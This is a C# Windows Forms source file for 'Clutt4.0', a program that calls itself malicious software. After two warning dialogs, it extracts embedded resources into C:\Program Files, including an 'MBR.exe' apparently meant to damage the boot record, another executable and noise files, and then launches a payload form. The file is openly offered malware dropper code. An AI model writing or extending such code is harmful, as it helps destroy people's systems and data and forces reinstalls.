using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace Clutt4
{
    public partial class Clutt4 : Form
    {
        public Clutt4()
        {
            InitializeComponent();
            TransparencyKey = BackColor;
        }

        private void Clutt4_Load(object sender, EventArgs e)
        {
            warning();
        }
        public void warning()
        {
            if (MessageBox.Show("Are you sure you want to run this program?" + Environment.NewLine + "This is malicious software!" + Environment.NewLine + "" + Environment.NewLine + "Click Yes to continue", "Clutt4.0", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                this.Close();
                Application.Exit();
            }
            else
            {
                Last_Warning();
            }
        }
        public void Last_Warning()
        {
            if (MessageBox.Show("THIS IS THE LAST WARNING!!!" + Environment.NewLine + "IF YOU RUN THE PROGRAM, YOUR COMPUTER WILL RECEIVE LARGE DAMAGE AND YOU WILL HAVE TO REINSTALL IT!" + Environment.NewLine + "" + Environment.NewLine + "DO YOU REALLY WANT TO RUN THIS DANGEROUS PROGRAM!?", "Clutt4.0", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                this.Close();
                Application.Exit();
            }
            else
            {
                NoWaring();
            }
        }
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //Important.DO NOT CHANGE!!!

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }

        public void NoWaring()
        {
            try
            {
                Extract("Clutt4", "C:\\Program Files", "Resources", "annoying_beep.wav"); //Extract
                Extract("Clutt4", "C:\\Program Files", "Resources", "annoying_beep_extended.wav"); //Extract
                Extract("Clutt4", "C:\\Program Files", "Resources", "MBR.exe"); //Extract
                Extract("Clutt4", "C:\\Program Files", "Resources", "bass_beep.wav"); //Extract
                Extract("Clutt4", "C:\\Program Files", "Resources", "beep1.wav"); //Extract
                Extract("Clutt4", "C:\\Program Files", "Resources", "beep2.wav"); //Extract
                Extract("Clutt4", "C:\\Program Files", "Resources", "piiiuuu.wav"); //Extract
                Extract("Clutt4", "C:\\Program Files", "Resources", "quic_beep.wav"); //Extract
                Extract("Clutt4", "C:\\Program Files", "Resources", "screen_shake.wav"); //Extract
                Extract("Clutt4", "C:\\Program Files", "Resources", "tiny_beep.wav"); //Extract
                Extract("Clutt4", "C:\\Program Files", "Resources", "tv_noise_dirty.wav"); //Extract
                Extract("Clutt4", "C:\\Program Files", "Resources", "tv_super_noise.wav"); //Extract
                Extract("Clutt4", "C:\\Program Files", "Resources", "tv_very_dirty.wav"); //Extract
                Extract("Clutt4", "C:\\Program Files", "Resources", "media_snd.exe"); //Extract
            }
            catch(Exception ex) { }

            this.Hide();
            var NewForm = new Payload_start();
            NewForm.ShowDialog();
            this.Close();
        }
    }
}
